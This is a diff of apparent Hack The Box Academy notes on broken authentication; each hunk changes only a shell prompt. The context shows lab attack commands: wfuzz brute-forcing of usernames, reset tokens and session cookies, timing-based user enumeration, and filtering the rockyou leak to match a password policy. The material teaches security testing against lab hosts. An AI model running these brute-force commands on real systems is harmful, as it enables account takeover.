@@ -230,7 +230,7 @@ username=test&password=test
 Another option would be to use `Copy` > `Copy as cURL command`, which would copy the entire `cURL` command, which we can use in the Terminal to repeat the same HTTP request:
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl 'http://URL:PORT/login.php' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://URL:PORT' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://URL:PORT/login.php' -H 'Cookie: PHPSESSID=8iafr4t6c3s2nhkaj63df43v05' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' --data-raw 'username=test&password=test'
+root@htb[/htb]$ curl 'http://URL:PORT/login.php' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://URL:PORT' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://URL:PORT/login.php' -H 'Cookie: PHPSESSID=8iafr4t6c3s2nhkaj63df43v05' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' --data-raw 'username=test&password=test'
 ```
 
 As we can see, this command also contains the parameters `--data-raw 'username=test&password=test'`.
@@ -383,7 +383,7 @@ We can carry out the brute force attack using `wfuzz` and a reverse string match
 &#x20; Brute Forcing Usernames
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ wfuzz -c -z file,/opt/useful/SecLists/Usernames/top-usernames-shortlist.txt -d "Username=FUZZ&Password=dummypass" --hs "Unknown username" http://brokenauthentication.hackthebox.eu/user_unknown.php
+root@htb[/htb]$ wfuzz -c -z file,/opt/useful/SecLists/Usernames/top-usernames-shortlist.txt -d "Username=FUZZ&Password=dummypass" --hs "Unknown username" http://brokenauthentication.hackthebox.eu/user_unknown.php
 
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -471,7 +471,7 @@ Download the script [timing.py](https://academy.hackthebox.com/storage/modules/8
 &#x20; Brute Forcing Usernames
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 timing.py /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt
+root@htb[/htb]$ python3 timing.py /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt
 
 [+] user root took 0.003
 [+] user admin took 0.263
@@ -538,7 +538,7 @@ Keep in mind that modern best practices highly recommend using more robust algor
 &#x20; Brute Forcing Usernames
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 hashtime.py
+root@htb[/htb]$ python3 hashtime.py
 
 sha1:   0:00:00.000082
 scrypt: 0:00:03.907575
@@ -647,7 +647,7 @@ Suppose that the web application accepts such passwords as valid. Now let’s de
 Within a few tries, we should be able to infer the policy even if the message is generic. Let us now suppose that this web application requires a string between 8 and 12 characters, with at least one uppercase and lowercase character. We now take a giant wordlist and extract only passwords that match this policy. Unix `grep` is not the fastest tool but allows us to do the job quickly using POSIX regular expressions. The command below will work against rockyou-50.txt, a subset of the well-known `rockyou` password leak present in SecLists. This command finds lines have at least one uppercase character (`'[[:upper:]]'`), and then only lines that also have a lowercase one (`'[[:lower:]]'`) and with a length of 8 and 12 chars ('^.{8,12}$') using extended regular expressions (-E).
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ grep '[[:upper:]]' rockyou.txt | grep '[[:lower:]]' | grep -E '^.{8,12}$' | wc -l
+root@htb[/htb]$ grep '[[:upper:]]' rockyou.txt | grep '[[:lower:]]' | grep -E '^.{8,12}$' | wc -l
 
 416712
 ```
@@ -718,7 +718,7 @@ Also, consider that the same application replies with a `Valid token` message if
 &#x20; Predictable Reset Token
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ wfuzz -z range,00000-99999 --ss "Valid" "https://brokenauthentication.hackthebox.eu/token.php?user=admin&token=FUZZ"
+root@htb[/htb]$ wfuzz -z range,00000-99999 --ss "Valid" "https://brokenauthentication.hackthebox.eu/token.php?user=admin&token=FUZZ"
 
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -866,7 +866,7 @@ Let us consider the following example.
 Line 4 of the server’s response shows a `Set-Cookie` header that sets a `SESSIONID` to `757365723A6874623B726F6C653A75736572`. If we decode this hex value as ASCII, we see that it contains our `userid`, `htb`, and role (standard `user`).
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo -n 757365723A6874623B726F6C653A75736572 | xxd -r -p; echo
+root@htb[/htb]$ echo -n 757365723A6874623B726F6C653A75736572 | xxd -r -p; echo
 
 user:htb;role:user
 ```
@@ -920,7 +920,7 @@ We should examine some cookie values, and after having observed that the length 
 [Wfuzz](https://github.com/xmendez/wfuzz/) can be fed by another program using a classic pipe, and we will use `John` as a feeder. We set `John` in incremental mode, using the built-in "LowerNum" charset that matches our observation (`--incremental=LowerNum`), we specify a password length of 6 chars (`--min-length=6 --max-length=6`), and we also instruct `John` to print the output as stdout (`--stdout`). Then, `wfuzz` uses the payload from stdin (`-z stdin`) and fuzzes the "HTBSESS" cookie (`-b HTBSESS=FUZZ`), looking for the string `"Welcome"` (`--ss "Welcome"`) in server responses for the given URL.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ john --incremental=LowerNum --min-length=6 --max-length=6 --stdout| wfuzz -z stdin -b HTBSESS=FUZZ --ss "Welcome" -u https://brokenauthentication.hackthebox.eu/profile.php 
+root@htb[/htb]$ john --incremental=LowerNum --min-length=6 --max-length=6 --stdout| wfuzz -z stdin -b HTBSESS=FUZZ --ss "Welcome" -u https://brokenauthentication.hackthebox.eu/profile.php 
 
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
